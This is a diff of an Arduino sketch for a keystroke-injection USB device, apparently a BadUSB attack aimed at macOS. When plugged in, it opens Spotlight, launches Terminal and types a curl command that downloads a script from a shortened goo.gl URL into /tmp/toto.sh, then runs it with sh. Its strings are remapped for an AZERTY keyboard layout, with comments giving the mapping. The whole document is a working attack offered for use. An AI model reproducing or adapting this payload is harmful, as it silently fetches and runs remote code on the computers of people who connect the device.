@@ -1,4 +1,4 @@
-#include "azertykeyboard.h"
+#include "Keyboard.h"
 
 int RXLED = 17;
 
@@ -15,23 +15,39 @@ void setup(){
   if(digitalRead(14) == LOW){
     blinkNoHack();
   }else {
+    // Begining the Keyboard stream
     Keyboard.begin();
   
-    delay(100);
+    // Wait 500ms
+  
+    delay(1000);
     Keyboard.press(KEY_LEFT_GUI);
     Keyboard.press(' ');
     Keyboard.releaseAll();
 
-    delay(500);
-    Keyboard.print(F("terminal"));
+    delay(1000);
+    Keyboard.print(F("ter;inql"));
   
     delay(500);
     typeKey(KEY_RETURN);
+    delay(500);
 
-    Keyboard.print(F("curl -L http://goo.gl/tM4UU9 > /tmp/toto.sh")    
-    delay(1000);
+    // . = :
+    // > = /
+    // = = -
+    // < = .
+    //  = >
 
-    Keyboard.print(F("sh /tmp/toto.sh")
+    Keyboard.print(F("curl =L goo<gl>Nedj*n =o >t;p>toto<sh"));
+    typeKey(KEY_RETURN);
+    delay(500);
+    // Keyboard.print(F("ch;od _x >t;p>toto<sh"));
+    
+    delay(500);
+    typeKey(KEY_RETURN);
+    delay(100);
+
+    Keyboard.print(F("sh >t;p>toto<sh"));
     delay(500);
     typeKey(KEY_RETURN);
     
